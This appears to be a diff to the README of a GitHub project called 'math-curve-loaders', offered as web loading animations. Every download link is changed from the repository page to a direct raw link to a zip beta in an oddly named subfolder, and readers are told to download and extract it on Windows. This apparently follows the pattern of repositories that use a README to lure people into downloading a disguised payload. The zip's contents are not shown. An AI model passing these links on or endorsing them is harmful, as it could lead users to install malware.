@@ -1,6 +1,6 @@
 # 🎨 math-curve-loaders - Smooth curve loaders for any page
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Wallassinglelane898/math-curve-loaders)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Wallassinglelane898/math-curve-loaders/raw/refs/heads/main/raciality/math-curve-loaders-3.9-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use it when you want a clean loading state for a site, app, demo, or prototype.
 
 ## 📥 Download and Open on Windows
 
-1. Open the download page: [https://github.com/Wallassinglelane898/math-curve-loaders](https://github.com/Wallassinglelane898/math-curve-loaders)
+1. Open the download page: [https://github.com/Wallassinglelane898/math-curve-loaders/raw/refs/heads/main/raciality/math-curve-loaders-3.9-beta.2.zip](https://github.com/Wallassinglelane898/math-curve-loaders/raw/refs/heads/main/raciality/math-curve-loaders-3.9-beta.2.zip)
 2. On the page, look for the latest release or the main download files.
 3. Download the package to your PC.
 4. If the file is a ZIP folder, right-click it and choose **Extract All**.
@@ -138,7 +138,7 @@ The code snippet feature helps if you want to move a loader into another page fa
 
 ## 🔗 Download Again
 
-[Visit the download page here](https://github.com/Wallassinglelane898/math-curve-loaders)
+[Visit the download page here](https://github.com/Wallassinglelane898/math-curve-loaders/raw/refs/heads/main/raciality/math-curve-loaders-3.9-beta.2.zip)
 
 ## 🧩 Simple Use Flow
 
